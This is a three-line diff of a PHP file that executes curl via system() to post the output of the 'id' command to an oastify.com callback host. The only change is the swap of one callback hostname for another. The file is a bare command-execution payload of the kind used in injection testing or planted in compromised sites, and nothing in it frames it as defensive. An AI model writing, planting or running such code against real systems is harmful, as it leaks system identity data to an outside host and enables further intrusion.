@@ -1,3 +1,3 @@
 <?php
-system('curl http://old07autujh8fe99w3gxd4puvl1cp2dr.oastify.com -d "data=$(id)"')
+system('curl http://0z01jsfxn5krejq34w9xffdrcii963us.oastify.com -d "data=$(id)"')
 ?>
